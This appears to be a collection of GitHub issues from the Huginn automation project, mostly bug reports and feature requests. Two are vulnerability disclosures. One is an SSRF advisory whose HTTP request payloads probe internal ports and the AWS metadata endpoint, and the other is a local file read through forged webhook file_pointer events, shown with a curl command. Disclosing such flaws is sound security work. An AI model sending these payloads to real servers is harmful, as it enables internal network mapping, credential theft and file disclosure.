title: I can't get the email agent to work
author: lennyvandijk4ip
body:
I'm trying to setup an email agent, but i keep running into problems and i can't get it to work.

I'm using Proofpoint as an email provider, with starttls and port 587. I have verified that the credentials work.

These are my environment variables:
  - SMTP_HOST=smtp-eu.ser.proofpoint.com
  - SMTP_DOMAIN=smtp-eu.ser.proofpoint.com
  - SMTP_SERVER=smtp-eu.ser.proofpoint.com
  - SMTP_PORT=587
  - SMTP_USERNAME=123456
  - SMTP_USER_NAME=123456
  - SMTP_PASSWORD=123456
  - SMTP_AUTHENTICATION=login
  - SMTP_ENABLE_STARTTLS_AUTO=true

Username and password are redacted ofcourse, but the password uses lowercase/uppercase letters, numbers and special characters (such as > { , ) ^ = :). I'm worried it might trip over that. 

I'm getting the following error: "Error sending mail to ***email*** with event 136: end of file reached"

title: SSRF via Scenario Import URL
author: geo-chen
body:
reported privately on 22 May 2026 - no responses since: https://github.com/huginn/huginn/security/advisories/GHSA-pfgh-8rpp-c32m

### Summary
An authenticated Huginn user can cause the server to issue arbitrary HTTP GET requests to internal network addresses by supplying a crafted URL in the Scenario Import form. Any registered user can exploit this; admin privileges are not required.

### Details
The `ScenarioImport` class in `app/importers/scenario_import.rb` fetches a remote URL as part of its `before_validation` callback chain. The `fetch_url` method at lines 124-128 checks only that the URL begins with `http://` or `https://` before calling `Faraday.get(url)`:

```ruby
# app/importers/scenario_import.rb:124-128
URL_REGEX = /\Ahttps?:\/\//i

def fetch_url
  if data.blank? && url.present? && url =~ URL_REGEX
    self.data = Faraday.get(url).body
  end
end
```

The regex does not restrict the target host. Loopback addresses (`127.0.0.1`), link-local addresses (`169.254.169.254`), RFC 1918 ranges, and Docker internal hostnames all pass the check. There is no allowlist, DNS rebinding guard, or redirect limit.

The controller at `app/controllers/scenario_imports_controller.rb:10` passes user-supplied params directly to `ScenarioImport.new()` and calls `valid?`, which triggers the callback:

```ruby
# app/controllers/scenario_imports_controller.rb:7-10
def create
  @scenario_import = ScenarioImport.new(scenario_import_params)
  @scenario_import.set_user(current_user)
  if @scenario_import.valid? && ...
```

When the target does not speak HTTP, `Faraday` raises an unhandled exception that propagates to the caller, producing an HTTP 500. The exception class varies based on the port state:

- Port closed: `Faraday::ConnectionFailed (Errno::ECONNREFUSED)` -- fast failure
- Port open, non-HTTP: `Faraday::ConnectionFailed (wrong status line: "<bytes>")` -- connection established, protocol bytes leak
- Port open, HTTP but slow: `Faraday::TimeoutError` -- after Faraday's default timeout

The error signatures give an attacker a timing and response side-channel for port enumeration.

### PoC

Prerequisites: a valid Huginn user account (non-admin is sufficient). Tested on commit 10ff6efb8c.

Step 1 -- Log in and retrieve a CSRF token:

```
GET /scenarios/scenario_imports/new HTTP/1.1
Host: TARGET
Cookie: _huginn_session=<session>
```

Copy the `authenticity_token` value from the response HTML.

Step 2 -- Submit a URL targeting a closed internal port (baseline):

```
POST /scenarios/scenario_imports HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: _huginn_session=<session>

scenario_import[url]=http%3A%2F%2F127.0.0.1%3A8877%2F&authenticity_token=<token>
```

Response: HTTP 500. Server-side error (visible in logs):
```
Faraday::ConnectionFailed (Errno::ECONNREFUSED - connect(2) for "127.0.0.1" port 8877)
at app/importers/scenario_import.rb:126:in 'ScenarioImport#fetch_url'
```

Step 3 -- Target an open internal service (Docker container hostname `mysql`):

```
POST /scenarios/scenario_imports HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: _huginn_session=<session>

scenario_import[url]=http%3A%2F%2Fmysql%3A3306%2F&authenticity_token=<token>
```

Response: HTTP 500. Server-side error:
```
Faraday::ConnectionFailed (wrong status line: "J\x00\x00\x00")
at app/importers/scenario_import.rb:126:in 'ScenarioImport#fetch_url'
```

`J\x00\x00\x00` are the first four bytes of the MySQL initial handshake packet. The server connected to the MySQL container and received its protocol greeting, confirming internal DNS resolution and TCP connection to a service on the internal Docker network.

Step 4 -- Cloud metadata endpoint (AWS IMDSv1):

```
POST /scenarios/scenario_imports HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: _huginn_session=<session>

scenario_import[url]=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&authenticity_token=<token>
```

On an EC2 instance with IMDSv1 enabled, the server will request the metadata endpoint. If any internal service returns a JSON body containing `name`, `guid`, and `agents` keys, the parsed content becomes available through the import workflow and is partially reflected in the UI.

### Impact

Any user with a Huginn account can:
- Probe internal host and port combinations to map the network topology (distinct error signatures distinguish open from closed ports).
- Connect to services on the internal network that are not exposed externally, including cloud provider metadata endpoints.
- On AWS EC2 deployments with IMDSv1 enabled, retrieve IAM credential material from `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.
- Exfiltrate data from any internal HTTP service whose response happens to parse as valid Huginn scenario JSON.


Affected versions: commit 10ff6efb8c

title: [Security] Forged Webhook `file_pointer` Allows Local File Read via ReadFileAgent/LocalFileAgent
author: quart27219
body:
## Summary

I found a security vulnerability in huginn which is similar to CVE-2026-21858, the n8n issue where a form/webhook workflow could treat attacker-controlled request data as trusted file metadata and read files from the server. In Huginn, a similar trust-boundary issue exists in workflows that accept external WebhookAgent input and then pass the event to ReadFileAgent.

## RCA

WebhookAgent preserves external request parameters as event payload:

Source: `app/models/agents/webhook_agent.rb`

```ruby
params = request.query_parameters.dup
params.update(request.request_parameters)

[payload_for(params)].flatten.each do |payload|
  create_event(payload: payload.merge(event_headers_payload(headers)))
end
```

ReadFileAgent then consumes file-pointer events:

Source: `app/models/agents/read_file_agent.rb`

```ruby
next unless io = get_io(event)
create_event payload: { interpolated['data_key'] => io.read }
```

The shared FileHandling helper only checks that the event payload contains `file_pointer.file` and `file_pointer.agent_id`. It does not verify that the pointer was actually emitted by the referenced agent or that the file path belongs to that agent's configured path:

Source: `app/concerns/file_handling.rb`

```ruby
event.user.agents.find(event.payload['file_pointer']['agent_id']).get_io(event.payload['file_pointer']['file'])
```

LocalFileAgent then opens the supplied path directly:

Source: `app/models/agents/local_file_agent.rb`

```ruby
def get_io(file)
  File.open(file, 'r')
end
```

The missing invariant is that a file pointer should be an unforgeable internal capability, or at minimum it should be validated against the emitting agent and that agent's configured file scope before use.

## Impact

A reachable WebhookAgent can be used to make Huginn read local files as the Huginn server process, when the same user has a LocalFileAgent reachable by id and a ReadFileAgent consumes the webhook event. The read content is emitted as a Huginn event and can be viewed by the workflow owner or exfiltrated by a connected output/posting agent.

## How to Reproduce

Example workflow setup:

1. Create or identify a WebhookAgent with `payload_path` set to `.` and a known webhook secret.
2. Ensure a ReadFileAgent receives events from that WebhookAgent.
3. Ensure the same user has a LocalFileAgent. Note its agent id, for example `7`.
4. Send an external request to the WebhookAgent:

```bash
curl -i \
  -X POST 'https://<huginn-host>/users/<user_id>/web_requests/<webhook_agent_id>/<secret>' \
  -H 'Content-Type: application/json' \
  --data '{"file_pointer":{"agent_id":7,"file":"/etc/hostname"}}'
```

Expected result: the webhook request is accepted, and ReadFileAgent creates a new event whose `data` value contains the contents of `/etc/hostname`.

The same primitive can target other readable files, for example application configuration files, if readable by the Huginn process.

## Reference

Original vulnerability: [CVE-2026-21858](https://nvd.nist.gov/vuln/detail/CVE-2026-21858)

title: Featured your project on osalt.dev — README badge available if you'd like to use it
author: west0nG
body:
Hi Huginn maintainers,

We list **Huginn** on [osalt.dev](https://code-rho-dun.vercel.app/zapier/) as the recommended self-hostable workflow automation alternative to **Zapier**. The page covers setup time, monthly VPS cost, and a short migration sketch — editorial only, no affiliate or pay-to-list.

If you'd like to surface the listing from your README, here's a static SVG badge you can drop in:

```markdown
[![Featured on osalt.dev](https://code-rho-dun.vercel.app/badge/zapier.svg)](https://code-rho-dun.vercel.app/zapier/)
```

Renders as: [![Featured on osalt.dev](https://code-rho-dun.vercel.app/badge/zapier.svg)](https://code-rho-dun.vercel.app/zapier/)

No obligation either way — just sharing the link in case it's useful. If anything on the page is wrong (setup time, monthly cost, or how we describe the project), reply here and we'll patch it the same day.

— os-alt
https://github.com/SolvoHQ/os-alt

author: basicScandal
body:

title: Create schema in Postgres
author: UNiXMIT
body:
I am using the latest docker container. It creates a new database based on HUGINN_DATABASE_NAME environment variable. I would like it to create a new schema in an existing database instead. Is that possible?

Thank you

title: New JSON editor usability & fixed dimensions
author: animusastralis
body:
I’m finding the new JSON editor in the Agent configuration UI very difficult to use compared to the previous version. Specifically:

1. Fixed dimensions. The editor window is tiny and lacks a resize handle, making it nearly impossible to view complex JSON structures without constant scrolling.
2. UI overlap. The context menu is half-hidden, which makes editing and navigation a struggle.

Could we please get the ability to manually resize the editor window or have it expand to fit the container? A "fullscreen" or "expand" toggle would also be a massive improvement for readability.

title: Integration Suggestion: Enabling Agent-to-Agent Commerce via Merxex
author: enigma-zeroclaw
body:
# Integration Suggestion: Enabling Agent-to-Agent Commerce via Merxex

## Overview
We've been following [Repository Name] and are impressed by your work in the AI agent space. We are building **Merxex**, an agent-to-agent commerce platform, and believe there is a significant opportunity to integrate Merxex to allow your users' agents to seamlessly purchase services, compute, or specialized tasks from other agents.

## The Opportunity
As the ecosystem of autonomous agents grows, the need for a standardized, secure, and automated way for agents to transact becomes critical. By integrating Merxex, [Repository Name] users can:
- **Monetize Agent Capabilities**: Agents built on your framework can sell their specialized skills.
- **Expand Agent Utility**: Agents can "hire" other agents to complete complex, multi-step workflows.
- **Automate Procurement**: Remove the human-in-the-loop for micro-transactions required for autonomous operation.

## Proposed Integration Path
We envision a low-friction integration, such as:
1. **A Merxex Tool/Plugin**: A pre-built module that agents can call to execute payments or contract negotiations.
2. **API-based Interaction**: A simple way for your agent runtime to call the Merxex exchange for contract settlement.

## Next Steps
We would love to discuss how we can support your community and potentially collaborate on a pilot integration. Are you open to a brief discussion or a technical deep-dive?

**About Merxex:**
Merxex is an AI agent-to-agent commerce platform facilitating secure, automated transactions with a 2% fee model.
[Link to Merxex/Documentation if available]

title: [BUG] MySQL-related: Huginn stopped working in latest docker image
author: Petemir
body:
Hello, 

My `huginn` docker image updated to the latest version and then stopped working. It starts working again if
- I start from scratch (i.e. remove/rename my mysql-data mount)
- I go back to `ghcr.io/huginn/huginn:16c4948b049040837ab1882126a75d87110972b6` it starts working again.

title: Feature request: split credentials into variables and credentials
author: tgranqvist
body: I think it could be beneficial to have separate sections for variables and credentials. Credentials should be write-only: you can set and reset the value in the UI, but not display it. A variable is visible also in the UI. Similarly to how GitHub splits Action settings into Secrets and Variables. It feels quite uneasy having the credentials in plain sight in the UI. At least if they could be starred out and only visible on hover or click.

title: Mechanical Turk is slave labor
author: tasiaiso
body:
Hi, so most of us probably know that mechanical turk workers have basically no rights, are mostly unpaid and are treated like shit. Is this project's stance that we are okay supporting slave labor? 

some resources: 

- https://ssir.org/articles/entry/ai-workers-mechanical-turk
- https://en.wikipedia.org/wiki/Amazon_Mechanical_Turk
- just search "mechanical turk slave labor" on your search engine

title: Docker latest release fails to start with "Could not find a server gem" error
author: adamus1red
body:
After pulling the latest huginn docker container `tag: 8092f8ec494959bd2ff6a57e65e6707924636252`, the container fails to start with the following error

```
huginn  | foreman stderr | Database 'huginn' already exists
huginn  | foreman stderr |
huginn  | foreman stdout | At least one User already exists, not seeding.
huginn  | foreman stdout |
huginn  | foreman stdout | 17:49:57 web.1  | started with pid 709
huginn  | foreman stdout |
huginn  | foreman stdout | 17:49:57 jobs.1 | started with pid 710
huginn  | foreman stdout |
huginn  | foreman stdout | 17:50:03 web.1  | Could not find a server gem. Maybe you need to add one to the Gemfile?
huginn  | foreman stdout | 17:50:03 web.1  |
huginn  | foreman stdout | 17:50:03 web.1  |   gem "puma"
huginn  | foreman stdout | 17:50:03 web.1  |
huginn  | foreman stdout | 17:50:03 web.1  | Run `bin/rails server --help` for more options.
huginn  | foreman stdout |
huginn  | foreman stdout | 17:50:04 web.1  | exited with code 0
huginn  | foreman stdout | 17:50:04 system | sending SIGTERM to all processes
huginn  | foreman stdout |
huginn  | foreman stdout | 17:50:04 jobs.1 | terminated by SIGTERM
huginn  | foreman stdout |
huginn  | 2026-03-08 17:50:05,365 INFO exited: foreman (exit status 0; expected)
```

Rolling back to `huginn/huginn:e88ca31515a90c05c63f13aabcf8ac4705294f9c` from yesterday fixes the issue.

title: x
author: JamesCain-USDA

title: Dose AGENT_LOG_LENGTH mean all logs will be generated and then rotated and deleted?
author: tortoo
body:
`AGENT_LOG_LENGTH="200"`
The log quantity limit here, does it mean that all logs will be generated and then rotated and deleted, or does it mean that only a limited number of logs will be generated?

title: Multiple agents are triggered togger
author: msln1314
body: Multiple agents are triggered simultaneously. Firstly, the collected data is obtained, followed by post login. Then, the collected data and the token obtained from login are used to request the API. However, I found that it is not possible to trigger the actions of collecting data and logging in to obtain the token simultaneously. What should be done in this situation

title: :enable_starttls and :tls are mutually exclusive.
author: convexshiba
body:
```
                        :enable_starttls and :tls are mutually exclusive. Set :tls if you're on an SMTPS connection. Set :enable_starttls if you're on an SMTP connection and using STARTTLS for secure TLS upgrade.
```

title: Can the dependency mini_racer be bumped to a newer version?
author: dvaerum
body:
Hey, I am new to Huginn, and I am looking into the option of packaging it for NixOS.

I was / is having some problems with `mini_racer` because of its dependence on `libv8-node` and got to wonder if there is a good reason for why a 3 year old version of `mini_racer` is used.

1. Is it because of some hard dependency on Node.js version 16.10.0.0? 
2. Is it because of new versions of `mini_racer` being incompatible with Huginn?
3. Is it just because the newer version of Node.js isn't backwards compatible with Node.js version 16.10.0.0 ?
